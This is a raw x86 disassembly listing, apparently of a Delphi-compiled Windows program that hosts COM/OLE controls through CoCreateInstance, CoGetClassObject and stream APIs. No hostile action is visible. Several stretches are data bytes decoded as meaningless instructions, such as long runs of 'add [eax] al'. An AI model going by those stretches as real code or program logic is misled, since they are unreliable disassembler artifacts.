mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x4 ]
call sub_465150
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465336
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_46533c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_46537b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x4 ]
call sub_465150
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465382
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_465388
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov edx 0x8000
mov eax r-xdata
call sub_40d4ec
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_465494
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
mov ebx [ ebp + 0x8 ]
push ebx
push ecx
push edx
push eax
call [ rw-data ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4654bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405a40
xor eax eax
push ebp
push sub_46551b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x8000ffff
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465522
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_46552c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_465581
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465588
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x10
mov eax [ rw-data ]
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4655b0
push 0xfe0047a6
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add bh bh
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add al ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add cl ah
inc [ eax ]
add [ eax - 0x5a ] ch
inc edi
add dl ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4655fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465604
retn
sub_4656b6
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
push esi
inc esi
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx ] dl
inc eax
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ esi ] cl
push esp
inc ebp
jbe r-xdata
add [ esp + 0x4 ] 0xfffffdb0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xe0 ]
outsb
je r-xdata
add al 0xb4
std
imul esi [ ebx + 0x70 ] 0x68637461
nop
int3
sub_465bbb
mov esp 0xeff19bfb
sbb dl [ eax ]
test ch ch
add [ edx + 0x71d3400 ] ch
cmpsb [ esi ] [ edi ]
pop edx
inc esi
add [ eax + 0x2 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
mov edx 0x5400465a
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ esi ] dl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
salc
pop edx
inc esi
add [ eax + 0x2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ecx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc bl [ ebx + 0x46 ]
add [ edx + eax ] bl
add [ eax ] al
add [ eax ] al
add [ ecx - 0x4b4e694e ] cl
mov edx 0x9cb6101a
add [ edx + 0x71d3400 ] ch
dec esi
pop ebx
inc esi
add [ eax + 0x2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
jbe r-xdata
add [ esp + edi * 8 + 0x34a80041 ] bl
inc eax
add [ eax - 0x1bffb997 ] ch
xor [ eax ] eax
add [ edx ] dh
inc eax
add ah ah
bound eax [ esi ]
cld
jbe r-xdata
inc esi
add [ edx + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
xchg edx eax
pop edx
inc esi
add [ edx + eax ] cl
add [ eax ] al
add [ eax ] al
add [ ebx + 0x465cccc0 ] cl
add [ edx + 0x465b ] bl
add [ eax ] al
add [ eax + 0x4000465d ] dh
pop esi
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dh
pop ebp
inc esi
add [ eax ] dh
pop esi
inc esi
add [ eax + 0x2 ] ch
add [ eax ] al
nop
les eax [ ebx ]
dec eax
add eax [ edx ]
mov al [ 0xffffffff9c004034 ]
cld
inc ecx
add [ eax - 0x57ffbfcc ] ch
imul eax [ esi ] sub_4031e4
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x58 ]
je r-xdata
add [ eax + 0x6a ] ah
inc esi
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
clc
inc ebx
add [ eax - 0x3fffbbd5 ] ah
jae r-xdata
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
add [ ebp + eax + 0x4580044 ] ch
inc esp
add [ eax ] bh
jpe r-xdata
test [ ebx ] sub_440320
test al 0x74
inc esi
add [ eax + 0x3 ] ah
inc edx
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + eax * 4 + 0x46 ] dh
add [ eax + 0x60 ] bh
inc esi
add [ eax ] dl
jb r-xdata
add al [ eax ]
add ah dl
adc [ eax ] eax
and al 0x2
add [ eax ] al
push 0x28004176
add al [ eax ]
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ eax + edi * 2 ] bh
inc esi
add [ eax + esi * 2 + 0x2a440046 ] al
inc eax
jge r-xdata
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add al ah
jb r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
inc esi
add [ edx + eax ] ch
add [ eax ] al
xor [ ebp + 0x41 ] 0x0
xor [ edx ] al
add [ eax ] al
or al [ eax ]
adc al 0x0
verw [ ebx ]
mov al 0xd
mov al 0xc
mov al 0xe
mov al 0x5
mov al 0x29
mov al 0x2a
mov al 0xd1
[ eax ]
push cs
add [ eax ] bl
add al [ eax ]
add [ esi + esi * 2 ] ch
inc ecx
add [ edx + eax ] bl
add [ eax ] al
clc
jne r-xdata
jo r-xdata
add [ eax + 0x1800446a ] bh
sub al 0x44
add [ edx + esi + 0x404c0044 ] ch
inc esp
add [ eax ] bh
cmp al [ eax + eax + 0x34 ]
cmp eax 0x69040044
inc esi
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add ah cl
imul eax [ esi ] 0x48
retn
outsd
insb
inc eax
pop esi
inc esi
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc ebx
outsd
outsb
je r-xdata
inc esi
add [ eax + 0x1400467c ] bh
jge r-xdata
add [ eax ] ah
add al al
jne r-xdata
add [ ecx + esi * 2 + 0x46 ] ah
add [ eax ] bh
push 0x46
add [ eax - 0x37ffb979 ] dh
mov [ esi ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] bl
jne r-xdata
add [ edx + ebp + 0x40 ] al
xor eax eax
push ebp
push sub_465f0d
push [ fs : eax ]
mov [ fs : eax ] esp
outsd
insb
int3
jb r-xdata
add [ eax + 0x2400467d ] bl
jle r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_413478
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405a10
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4643bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465f14
lea eax [ ebp - 0x8 ]
call sub_4059cc
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
jae r-xdata
mov ebp esp
add [ edi + edi * 2 ] ah
inc esi
add ah bl
jg r-xdata
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_465ea2
push [ fs : edx ]
add [ ebx - 0x1374aa40 ] cl
mov [ fs : edx ] esp
lea edx [ ebp - 0x4 ]
call sub_46436c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
rcl [ ebp + 0x68 ] cl
mov [ 0x6400465e ] al
push [ edx ]
add [ eax + eax * 4 ] ch
inc esi
add [ eax + 0x71 ] ch
inc esi
add [ ebx ] cl
push esp
dec edi
insb
inc ebx
outsd
outsb
je r-xdata
sub_465e64
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_465ea2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x4 ]
call sub_46436c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413904
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_465eb0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_465f0d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_413478
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405a10
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4643bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465f14
lea eax [ ebp - 0x8 ]
call sub_4059cc
lea eax [ ebp - 0x4 ]
call sub_4059cc
retn
sub_465f2c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40f1e8
mov eax esi
call sub_404dc4
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
pop esi
pop ebx
retn
sub_465f70
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403300
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x208 ]
add eax 0x10
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx r-xdata
mov eax ebx
call sub_403300
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_465fc7
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_46809c
pop ebp
retn 0x4
sub_466030
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp esi 0xfffffda1
jl r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
cmp esi 0xfffffda8
jg r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x24
sub_466078
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4428d8
or [ ebx + 0x24 ] 0x2
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov eax [ ebx + 0x208 ]
inc [ eax + 0x48 ]
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x34 ] 0x0
jle r-xdata
add esp 0xfffffff0
call sub_403570
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x3c ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ ebx + 0x240 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x34 ]
mov eax esi
call sub_41a3d8
mov eax [ ebx + 0x240 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_465f4c
mov [ ebx + 0x210 ] eax
mov eax ebx
call sub_4666ec
mov edx [ ebx + 0x218 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
lea eax [ ebx + 0x23c ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x58 ]
call sub_462f6c
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov esi eax
mov [ ebx + 0x244 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x3c ]
mov eax esi
call sub_41a3d8
mov eax [ ebx + 0x244 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
lea eax [ ebx + 0x21c ]
call sub_4059cc
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_462f6c
test [ ebx + 0x23d ] 0x4
je r-xdata
test [ ebx + 0x23e ] 0x2
jne r-xdata
inc edi
xor esi esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d80
mov ecx eax
mov eax [ ebx + 0x240 ]
mov edx esi
call sub_41a32c
inc esi
dec edi
jne r-xdata
test [ ebx + 0x23e ] 0x1
je r-xdata
xor edx edx
mov eax ebx
call sub_4402e4
mov eax ebx
test eax eax
je r-xdata
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x1
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_425c18
mov ecx eax
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_41a32c
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_41a238
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4671b8
inc esi
dec edi
jne r-xdata
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
push eax
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_462f6c
sub eax 0xfffffd9c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
test [ ebx + 0x23d ] 0x60
sete dl
mov eax ebx
call sub_446e18
push ebx
call sub_468128
call sub_462f6c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4662ac
push ebx
push esi
push edi
mov esi eax
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi ]
call sub_40324c
xor eax eax
mov [ esi ] eax
inc ebx
xor edi edi
mov eax [ esi ]
mov edx edi
call sub_41a238
call sub_40324c
inc edi
dec ebx
jne r-xdata
sub_4662e4
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_467790
cmp [ esi + 0x218 ] 0x0
je r-xdata
mov eax esi
call sub_466b04
mov eax esi
call sub_466bac
lea eax [ esi + 0x21c ]
call sub_4059cc
cmp [ esi + 0x218 ] 0x0
je r-xdata
push 0x1
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ esi + 0x218 ]
call sub_4059cc
mov eax [ esi + 0x210 ]
call sub_40324c
lea eax [ esi + 0x240 ]
call sub_4662ac
lea eax [ esi + 0x244 ]
call sub_4662ac
mov eax [ esi + 0x208 ]
dec [ eax + 0x48 ]
mov eax [ esi + 0x208 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
push 0x0
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4429fc
test bl bl
jle r-xdata
mov eax esi
call sub_466b6c
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_4663a4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466644
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46664b
lea eax [ ebp - 0xc ]
call sub_4059cc
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
xor eax eax
push ebp
push sub_46660f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_4036ec#5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
call sub_4059cc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_462f6c
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x214 ]
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_4059cc
push eax
push 0x0
push ebx
call CreateStreamOnHGlobal
call sub_462f6c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
call sub_462f6c
mov eax [ ebp - 0x4 ]
call sub_466bac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_462f6c
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_463178
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x210 ]
test ecx ecx
je r-xdata
sub ecx 0xfffffdb4
mov eax [ ebp - 0x4 ]
add eax 0x220
call sub_4059cc
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_462f6c
mov eax [ ebp - 0x4 ]
add eax 0x224
call sub_4059cc
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_462f6c
mov eax [ ebp - 0x4 ]
add eax 0x228
call sub_4059cc
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
mov eax [ ebp - 0x4 ]
add eax 0x234
push eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_463178
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
sub ecx 0xfffffff8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
push 0xfffffe0b
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
push 0xfffffdfe
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
push 0xfffffe00
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
push eax
call sub_468128
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0xfffffdff
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
sub_466694
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
mov ebx edx
cmp eax 0x80040112
jne r-xdata
call sub_462f6c
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_40319c
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
call sub_4039d8
sub_4666ec
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466806
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
push ebp
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_4059cc
push eax
push r-xdata
push 0x5
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoCreateInstance
pop edx
call sub_466694
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_4059cc
push eax
push r-xdata
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoGetClassObject
call sub_462f6c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x208 ]
mov edx [ edx + 0x28 ]
call sub_4047b8
push ebp
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405eac
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_4059cc
push eax
mov eax [ ebp - 0xc ]
push eax
push r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
pop edx
call sub_466694
pop ecx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46680d
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0xc ]
call sub_4046a8
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
sub_466834
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4668f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_466bac
push 0x0
push 0x2
call GlobalAlloc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] ebx
test ebx ebx
jne r-xdata
xor eax eax
push ebp
push j_sub_4036ec#4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_4059cc
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call CreateStreamOnHGlobal
call sub_462f6c
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_462f6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_40b92c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4668fd
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
sub_466904
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4663a4
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_443b64
mov edx esp
mov eax ebx
call sub_43fd64
push esp
mov eax ebx
call sub_4469e0
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
push eax
push 0x0
push 0xfffffffb
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebx + 0x22c ] 0x0
jne r-xdata
sub eax 0xfffffd9c
mov eax ebx
call sub_466e14
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
add esp 0x10
pop ebx
retn
mov eax ebx
call sub_446be4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax ebx
call sub_446be4
push eax
call ShowWindow
jmp r-xdata
sub_4669a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edx edx
push ebp
push j_sub_4036ec#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_446ee8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_444724
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ esi ]
cmp eax 0xbc00
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test [ ebx + 0x23e ] 0x1
jne r-xdata
cmp eax 0xc000
jae r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_446be4
push eax
mov eax [ ebx + 0x174 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub [ esi ] 0x9c00
sub_466a38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
setne al
pop esi
pop ebx
retn
sub_466a5e
mov eax eax
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403818#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443eec
mov eax [ ebp - 0x4 ]
push eax
push sub_467224
mov eax [ ebp - 0x4 ]
push eax
push sub_467b20
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
setne cl
mov edx r-xdata
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8 ]
